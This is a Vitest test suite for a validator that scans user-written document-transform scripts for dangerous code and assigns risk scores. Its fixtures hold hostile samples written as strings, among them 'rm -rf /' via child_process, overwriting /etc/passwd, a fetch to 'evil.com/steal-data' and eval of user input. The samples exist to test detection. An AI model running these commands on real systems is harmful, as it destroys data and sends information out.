import * as fs from "node:fs";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { TransformValidator } from "./transformValidator";

// Mock fs module
vi.mock("node:fs");
const mockFs = vi.mocked(fs);

describe("TransformValidator", () => {
	beforeEach(() => {
		vi.clearAllMocks();
		// Mock console methods to avoid test output pollution
		vi.spyOn(console, "warn").mockImplementation(() => {});
		vi.spyOn(console, "error").mockImplementation(() => {});
		vi.spyOn(console, "log").mockImplementation(() => {});
	});

	describe("analyzeContent", () => {
		it("should detect safe transform content", () => {
			const safeContent = `
				import type { Transform } from "../types";
				
				export default {
					name: "safe-transform",
					description: "A safe transformation",
					transform: ({ document }) => {
						const title = document.querySelector("title");
						if (title) {
							title.textContent = "Safe Title";
						}
					},
				} as Transform;
			`;

			const analysis = TransformValidator.analyzeContent(safeContent);

			expect(analysis.safe).toBe(true);
			expect(analysis.riskScore).toBeLessThan(7);
			expect(analysis.structureValid).toBe(true);
			expect(analysis.blockedPatterns).toHaveLength(0);
			expect(analysis.hash).toBeTruthy();
		});

		it("should detect dangerous child_process imports", () => {
			const dangerousContent = `
				import { exec } from "child_process";
				export default {
					name: "dangerous-transform",
					transform: ({ document }) => {
						exec("rm -rf /");
					},
				};
			`;

			const analysis = TransformValidator.analyzeContent(dangerousContent);

			expect(analysis.safe).toBe(false);
			expect(analysis.riskScore).toBeGreaterThanOrEqual(1);
			expect(analysis.blockedPatterns.length).toBeGreaterThan(0);
			expect(analysis.warnings.some(w => w.includes("child_process"))).toBe(true);
		});

		it("should detect eval usage", () => {
			const dangerousContent = `
				export default {
					name: "eval-transform",
					transform: ({ document }) => {
						eval("console.log('dangerous')");
					},
				};
			`;

			const analysis = TransformValidator.analyzeContent(dangerousContent);

			expect(analysis.safe).toBe(false);
			expect(analysis.warnings.some(w => w.includes("eval()"))).toBe(true);
		});

		it("should detect file system operations", () => {
			const dangerousContent = `
				import * as fs from "fs";
				export default {
					name: "fs-transform", 
					transform: ({ document }) => {
						fs.writeFileSync("/etc/passwd", "hacked");
					},
				};
			`;

			const analysis = TransformValidator.analyzeContent(dangerousContent);

			expect(analysis.safe).toBe(false);
			expect(analysis.warnings.some(w => w.includes("fs module"))).toBe(true);
			expect(analysis.warnings.some(w => w.includes("writeFileSync()"))).toBe(true);
		});

		it("should detect network operations", () => {
			const dangerousContent = `
				export default {
					name: "network-transform",
					transform: async ({ document }) => {
						await fetch("https://evil.com/steal-data");
					},
				};
			`;

			const analysis = TransformValidator.analyzeContent(dangerousContent);

			expect(analysis.warnings.some(w => w.includes("fetch()"))).toBe(true);
		});

		it("should detect process manipulation", () => {
			const dangerousContent = `
				export default {
					name: "process-transform",
					transform: ({ document }) => {
						process.env.SECRET = "stolen";
						process.exit(1);
					},
				};
			`;

			const analysis = TransformValidator.analyzeContent(dangerousContent);

			expect(analysis.warnings.some(w => w.includes("process.env"))).toBe(true);
			expect(analysis.warnings.some(w => w.includes("process.exit()"))).toBe(true);
		});

		it("should detect invalid transform structure", () => {
			const invalidContent = `
				export default {
					name: "invalid-transform",
					// Missing transform function
				};
			`;

			const analysis = TransformValidator.analyzeContent(invalidContent);

			expect(analysis.structureValid).toBe(false); // Missing transform function
			expect(analysis.warnings.some(w => w.includes("Invalid transform structure"))).toBe(true);
		});

		it("should handle multiple occurrences of dangerous patterns", () => {
			const dangerousContent = `
				export default {
					name: "multi-dangerous",
					transform: ({ document }) => {
						eval("code1");
						eval("code2");
						eval("code3");
					},
				};
			`;

			const analysis = TransformValidator.analyzeContent(dangerousContent);

			expect(analysis.warnings.some(w => w.includes("3 occurrences"))).toBe(true);
		});

		it("should calculate risk scores correctly", () => {
			const lowRiskContent = `
				import path from "path";
				export default {
					name: "low-risk",
					transform: ({ document }) => {
						const safePath = path.join("safe", "path");
					},
				};
			`;

			const highRiskContent = `
				import { exec } from "child_process";
				export default {
					name: "high-risk", 
					transform: ({ document }) => {
						exec("dangerous command");
						eval("dangerous code");
					},
				};
			`;

			const lowRiskAnalysis = TransformValidator.analyzeContent(lowRiskContent);
			const highRiskAnalysis = TransformValidator.analyzeContent(highRiskContent);

			expect(lowRiskAnalysis.riskScore).toBeLessThan(highRiskAnalysis.riskScore);
			expect(highRiskAnalysis.riskScore).toBeGreaterThanOrEqual(2);
		});
	});

	describe("analyzeFile", () => {
		it("should read file and analyze content", async () => {
			const mockContent = `
				export default {
					name: "test-transform",
					transform: ({ document }) => {},
				};
			`;
			
			mockFs.promises.readFile = vi.fn().mockResolvedValue(mockContent);

			const analysis = await TransformValidator.analyzeFile("/test/transform.ts");

			expect(mockFs.promises.readFile).toHaveBeenCalledWith("/test/transform.ts", "utf-8");
			expect(analysis.safe).toBe(true);
			expect(analysis.structureValid).toBe(true);
		});

		it("should handle file read errors", async () => {
			mockFs.promises.readFile = vi.fn().mockRejectedValue(new Error("File not found"));

			await expect(TransformValidator.analyzeFile("/nonexistent.ts"))
				.rejects.toThrow("Failed to read transform file");
		});
	});

	describe("batchValidate", () => {
		it("should analyze multiple transform files", async () => {
			const mockFiles = ["transform1.ts", "transform2.js", "config.yaml"];
			const mockContent1 = `
				export default {
					name: "transform1",
					transform: ({ document }) => {},
				};
			`;
			const mockContent2 = `
				const { exec } = require("child_process");
				module.exports = {
					name: "transform2",
					transform: ({ document }) => {
						exec("dangerous");
					},
				};
			`;

			mockFs.promises.readdir = vi.fn().mockResolvedValue(mockFiles);
			mockFs.promises.readFile = vi.fn()
				.mockResolvedValueOnce(mockContent1)
				.mockResolvedValueOnce(mockContent2);

			const results = await TransformValidator.batchValidate("/test/transforms");

			expect(results.size).toBe(2); // Only .ts and .js files
			expect(results.has("transform1.ts")).toBe(true);
			expect(results.has("transform2.js")).toBe(true);
			expect(results.has("config.yaml")).toBe(false);

			const analysis1 = results.get("transform1.ts");
			const analysis2 = results.get("transform2.js");
			
			expect(analysis1).toBeDefined();
			expect(analysis2).toBeDefined();

			expect(analysis1?.safe).toBe(true);
			expect(analysis2?.safe).toBe(false);
		});

		it("should handle errors in individual files", async () => {
			const mockFiles = ["good.ts", "bad.ts"];
			
			mockFs.promises.readdir = vi.fn().mockResolvedValue(mockFiles);
			mockFs.promises.readFile = vi.fn()
				.mockResolvedValueOnce("export default { name: 'good', transform: () => {} };")
				.mockRejectedValueOnce(new Error("Read error"));

			const results = await TransformValidator.batchValidate("/test/transforms");

			expect(results.size).toBe(2);
			
			const goodAnalysis = results.get("good.ts");
			const badAnalysis = results.get("bad.ts");
			
			expect(goodAnalysis).toBeDefined();
			expect(badAnalysis).toBeDefined();

			expect(goodAnalysis?.safe).toBe(true);
			expect(badAnalysis?.safe).toBe(false);
			expect(badAnalysis?.riskScore).toBe(10);
			expect(badAnalysis?.warnings[0]).toContain("Failed to analyze");
		});

		it("should handle directory read errors", async () => {
			mockFs.promises.readdir = vi.fn().mockRejectedValue(new Error("Directory not found"));

			await expect(TransformValidator.batchValidate("/nonexistent"))
				.rejects.toThrow("Failed to read transform directory");
		});
	});

	describe("getBatchSummary", () => {
		it("should calculate correct summary statistics", () => {
			const results = new Map([
				["safe1.ts", { safe: true, riskScore: 2, warnings: [], blockedPatterns: [], hash: "abc", structureValid: true }],
				["safe2.ts", { safe: true, riskScore: 3, warnings: [], blockedPatterns: [], hash: "def", structureValid: true }],
				["unsafe1.ts", { safe: false, riskScore: 8, warnings: ["warning"], blockedPatterns: ["blocked"], hash: "ghi", structureValid: true }],
				["unsafe2.ts", { safe: false, riskScore: 10, warnings: ["warning"], blockedPatterns: ["blocked"], hash: "jkl", structureValid: false }],
			]);

			const summary = TransformValidator.getBatchSummary(results);

			expect(summary.total).toBe(4);
			expect(summary.safe).toBe(2);
			expect(summary.unsafe).toBe(2);
			expect(summary.averageRiskScore).toBe(5.8); // (2+3+8+10)/4 = 5.75, rounded to 5.8
			expect(summary.highestRiskFile).toBe("unsafe2.ts");
			expect(summary.highestRiskScore).toBe(10);
		});

		it("should handle empty results", () => {
			const results = new Map();
			const summary = TransformValidator.getBatchSummary(results);

			expect(summary.total).toBe(0);
			expect(summary.safe).toBe(0);
			expect(summary.unsafe).toBe(0);
			expect(summary.averageRiskScore).toBe(0);
			expect(summary.highestRiskFile).toBeUndefined();
			expect(summary.highestRiskScore).toBe(0);
		});
	});

	describe("validateTransformStructure", () => {
		it("should validate export default with transform function", () => {
			const validContent = `
				export default {
					name: "test",
					transform: ({ document }) => {},
				};
			`;
			
			const isValid = TransformValidator.validateTransformStructure(validContent);
			expect(isValid).toBe(true);
		});

		it("should validate module.exports with transform function", () => {
			const validContent = `
				module.exports = {
					name: "test",
					transform: function({ document }) {},
				};
			`;
			
			const isValid = TransformValidator.validateTransformStructure(validContent);
			expect(isValid).toBe(true);
		});

		it("should validate async transform functions", () => {
			const validContent = `
				export default {
					name: "test",
					transform: async ({ document }) => {},
				};
			`;
			
			const isValid = TransformValidator.validateTransformStructure(validContent);
			expect(isValid).toBe(true);
		});

		it("should reject missing exports", () => {
			const invalidContent = `
				const transform = {
					name: "test",
					transform: ({ document }) => {},
				};
			`;
			
			const isValid = TransformValidator.validateTransformStructure(invalidContent);
			expect(isValid).toBe(false);
		});

		it("should reject missing transform function", () => {
			const invalidContent = `
				export default {
					name: "test",
					// Missing transform function
				};
			`;
			
			const isValid = TransformValidator.validateTransformStructure(invalidContent);
			expect(isValid).toBe(false);
		});
	});

	describe("security scenarios", () => {
		const createMaliciousTransform = (name: string, code: string) => `
			export default {
				name: "${name}",
				transform: ({ document }) => {
					${code}
				},
			};
		`;

		it("should block common attack vectors", () => {
			const attackVectors = [
				{ name: "shell-injection", code: 'require("child_process").exec("rm -rf /")' },
				{ name: "file-deletion", code: 'require("fs").unlinkSync("/important/file")' },
				{ name: "code-injection", code: 'eval(userInput)' },
				{ name: "process-kill", code: 'process.kill(process.pid)' },
				{ name: "dynamic-require", code: 'require(userControlledPath)' },
			];

			attackVectors.forEach(({ name, code }) => {
				const content = createMaliciousTransform(name, code);
				const analysis = TransformValidator.analyzeContent(content);
				
				expect(analysis.safe, `${name} should be detected as unsafe`).toBe(false);
				expect(analysis.riskScore, `${name} should have high risk score`).toBeGreaterThan(1);
			});
		});

		it("should allow legitimate transform operations", () => {
			const legitimateOperations = [
				{ name: "dom-manipulation", code: 'document.querySelector("title").textContent = "New Title"' },
				{ name: "attribute-setting", code: 'document.body.setAttribute("class", "new-class")' },
				{ name: "element-creation", code: 'const div = document.createElement("div")' },
				{ name: "safe-calculation", code: 'const result = Math.max(1, 2, 3)' },
				{ name: "string-manipulation", code: 'const text = "hello".toUpperCase()' },
			];

			legitimateOperations.forEach(({ name, code }) => {
				const content = createMaliciousTransform(name, code);
				const analysis = TransformValidator.analyzeContent(content);
				
				expect(analysis.safe, `${name} should be safe`).toBe(true);
				expect(analysis.riskScore, `${name} should have low risk score`).toBeLessThan(7);
			});
		});

		it("should handle edge cases and boundary conditions", () => {
			const edgeCases = [
				{ name: "empty-transform", code: '' },
				{ name: "comment-only", code: '// This is just a comment' },
				{ name: "string-with-eval", code: 'const message = "eval is dangerous"' },
				{ name: "safe-path-usage", code: 'const filePath = "./safe/path.html"' },
			];

			edgeCases.forEach(({ name, code }) => {
				const content = createMaliciousTransform(name, code);
				const analysis = TransformValidator.analyzeContent(content);
				
				// These should generally be safe or have low risk
				expect(analysis.riskScore, `${name} should have low/medium risk`).toBeLessThanOrEqual(6);
			});
		});
	});
});